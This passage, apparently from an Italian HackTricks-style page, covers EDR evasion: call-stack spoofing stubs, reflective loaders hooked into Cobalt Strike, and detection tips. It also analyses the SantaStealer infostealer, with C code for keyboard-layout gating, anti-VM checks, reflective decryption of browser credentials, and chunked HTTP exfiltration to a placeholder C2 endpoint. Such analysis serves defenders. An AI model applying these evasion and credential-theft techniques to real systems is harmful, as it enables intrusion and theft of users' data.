- Draugr‑style PIC stubs costruiscono una fake call chain (indirizzi di ritorno verso moduli benigni) e poi pivotano nella vera API.
- Questo neutralizza le rilevazioni che si aspettano stack canonici da Beacon/BOFs verso API sensibili.
- Abbinalo a tecniche di stack cutting/stack stitching per posizionarsi all'interno dei frame attesi prima del prologo dell'API.

Operational integration
- Preponi il reflective loader ai post‑ex DLL in modo che PIC e hooks si inizializzino automaticamente quando la DLL viene caricata.
- Usa uno script Aggressor per registrare le API target così Beacon e BOFs beneficiano in modo trasparente dello stesso percorso di evasione senza modifiche al codice.

Detection/DFIR considerations
- IAT integrity: voci che risolvono in indirizzi non‑image (heap/anon); verifica periodica dei puntatori di import.
- Stack anomalies: indirizzi di ritorno che non appartengono ad immagini caricate; transizioni improvvise verso PIC non‑image; ascendenza RtlUserThreadStart incoerente.
- Loader telemetry: scritture in‑process sull'IAT, attività precoce in DllMain che modifica gli import thunks, regioni RX inattese create al load.
- Image‑load evasion: se si effettua hooking di LoadLibrary*, monitora i load sospetti di automation/clr assemblies correlati con eventi di memory masking.

Related building blocks and examples
- Reflective loaders che eseguono IAT patching durante il load (e.g., TitanLdr, AceLdr)
- Memory masking hooks (e.g., simplehook) e stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (e.g., Draugr)

## SantaStealer Tradecraft for Fileless Evasion and Credential Theft

SantaStealer (aka BluelineStealer) illustra come gli info‑stealers moderni mescolano AV bypass, anti-analysis e credential access in un unico workflow.

### Keyboard layout gating & sandbox delay

- Un flag di configurazione (`anti_cis`) enumera i layout di tastiera installati tramite `GetKeyboardLayoutList`. Se viene trovato un layout cirillico, il sample lascia un marker vuoto `CIS` e termina prima di eseguire gli stealers, assicurando che non si attivi mai nelle località escluse pur lasciando un artefatto per l'hunting.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Logica a strati di `check_antivm`

- Variante A scorre la lista dei processi, esegue l'hash di ogni nome con un checksum rolling personalizzato e lo confronta con blocklist incorporate per debugger/sandbox; ripete il checksum sul nome del computer e controlla directory di lavoro come `C:\analysis`.
- Variante B ispeziona le proprietà di sistema (soglia del numero di processi, uptime recente), invoca `OpenServiceA("VBoxGuest")` per rilevare i Guest Additions di VirtualBox, ed esegue controlli temporali attorno alle sleep per individuare il single-stepping. Qualsiasi riscontro provoca l'aborto prima del lancio dei moduli.

### Helper fileless + double ChaCha20 reflective loading

- La DLL/EXE primaria incorpora un Chromium credential helper che viene o droppato su disco o mappato manualmente in-memory; la modalità fileless risolve import/relocations da sola in modo che non vengano scritti artefatti del helper.
- Quel helper conserva una DLL di secondo stadio criptata due volte con ChaCha20 (due chiavi da 32 byte + nonce da 12 byte). Dopo entrambe le passate, reflectively loads the blob (no `LoadLibrary`) and calls exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` derivate da [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).
- Le routine ChromElevator utilizzano direct-syscall reflective process hollowing per iniettare in un browser Chromium attivo, ereditare gli AppBound Encryption keys e decriptare password/cookie/carte di credito direttamente dai database SQLite nonostante l'hardening ABE.

### Raccolta modulare in-memory & esfiltrazione HTTP a chunk

- `create_memory_based_log` itera una tabella globale di function-pointer `memory_generators` e genera un thread per ogni modulo abilitato (Telegram, Discord, Steam, screenshots, documents, browser extensions, ecc.). Ogni thread scrive i risultati in buffer condivisi e segnala il conteggio dei file dopo una finestra di join di ~45s.
- Al termine, tutto viene zippato con la libreria `miniz` collegata staticamente come `%TEMP%\\Log.zip`. `ThreadPayload1` poi fa sleep per 15s e streama l'archivio in chunk da 10 MB via HTTP POST a `http://<C2>:6767/upload`, falsificando un boundary `multipart/form-data` da browser (`----WebKitFormBoundary***`). Ogni chunk aggiunge `User-Agent: upload`, `auth: <build_id>`, opzionale `w: <campaign_tag>`, e l'ultimo chunk appende `complete: true` così il C2 sa che il riassemblaggio è completato.

## Riferimenti

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)


{{#include ../banners/hacktricks-training.md}}
